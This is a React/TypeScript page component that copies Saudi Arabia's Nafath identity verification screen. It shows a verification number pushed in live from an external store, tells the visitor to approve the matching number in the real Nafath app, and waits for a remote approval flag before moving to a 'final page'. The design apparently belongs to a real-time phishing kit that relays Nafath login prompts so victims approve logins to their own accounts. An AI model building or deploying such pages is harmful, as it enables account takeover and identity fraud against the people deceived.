import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  verificationCode,
  isFormApproved,
  navigateToPage,
} from "@/lib/store";

export default function NafathVerify() {
  const [, navigate] = useLocation();
  const [showInstructions, setShowInstructions] = useState(true);
  const [code, setCode] = useState<string>("");

  // Emit page enter
  useEffect(() => {
    navigateToPage("تحقق نفاذ");
  }, []);

  // Subscribe to verification code changes
  useEffect(() => {
    // Check initial value
    if (verificationCode.value) {
      setCode(verificationCode.value);
    }
    
    // Subscribe to changes
    const unsubscribe = verificationCode.subscribe((newCode) => {
      console.log("Verification code received in NafathVerify:", newCode);
      if (newCode) {
        setCode(newCode);
      }
    });
    
    return () => {
      unsubscribe();
    };
  }, []);

  // Handle form approval
  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/final-page");
    }
  }, [isFormApproved.value, navigate]);

  const openNafathApp = () => {
    // Try to open Nafath app
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
    if (isIOS) {
      window.open("https://apps.apple.com/us/app/%D9%86%D9%81%D8%A7%D8%B0-nafath/id1598909871");
    } else {
      window.open("https://play.google.com/store/apps/details?id=sa.gov.nic.myid");
    }
  };

  return (
    <PageLayout variant="nafath">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-6">
          <img
            src="/images/nafath.png"
            alt="نفاذ"
            className="h-16 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">التحقق من الهوية</h1>
          <p className="text-gray-500 text-sm">
            افتح تطبيق نفاذ واختر الرقم المطابق
          </p>
        </div>

        {/* Verification Code */}
        <div className="flex flex-col items-center mb-6">
          <p className="text-[#1a5f4a] text-center text-sm mb-4">رمز التحقق</p>
          {code ? (
            <div className="w-32 h-32 rounded-full border-4 border-[#1a5f4a] flex items-center justify-center">
              <p className="text-[#1a5f4a] text-5xl font-bold">
                {code}
              </p>
            </div>
          ) : (
            <div className="w-32 h-32 rounded-full border-4 border-[#1a5f4a] border-t-transparent flex items-center justify-center animate-spin" />
          )}
        </div>

        {/* Instructions */}
        {showInstructions && (
          <div className="bg-blue-50 rounded-lg p-4 mb-6">
            <h3 className="font-semibold text-blue-800 mb-2">خطوات التحقق:</h3>
            <ol className="text-sm text-blue-700 space-y-2 list-decimal list-inside">
              <li>افتح تطبيق نفاذ على جوالك</li>
              <li>ستظهر لك إشعار بطلب تحقق</li>
              <li>اختر الرقم المطابق للرقم أعلاه</li>
              <li>انتظر حتى يتم التحقق</li>
            </ol>
            <button
              onClick={() => setShowInstructions(false)}
              className="text-blue-600 text-xs mt-2 hover:underline"
            >
              إخفاء التعليمات
            </button>
          </div>
        )}

        {/* Steps Images */}
        <div className="grid grid-cols-2 gap-4 mb-6">
          <div className="text-center">
            <img
              src="/images/nafaz-step-1.jpg"
              alt="Step 1"
              className="rounded-lg mb-2"
            />
            <p className="text-xs text-gray-500">الخطوة 1</p>
          </div>
          <div className="text-center">
            <img
              src="/images/nafaz-step-2.jpg"
              alt="Step 2"
              className="rounded-lg mb-2"
            />
            <p className="text-xs text-gray-500">الخطوة 2</p>
          </div>
        </div>

        {/* Open App Button */}
        <Button
          onClick={openNafathApp}
          className="w-full bg-[#1a5f4a] hover:bg-[#134436]"
          size="lg"
        >
          فتح تطبيق نفاذ
        </Button>
      </div>
    </PageLayout>
  );
}
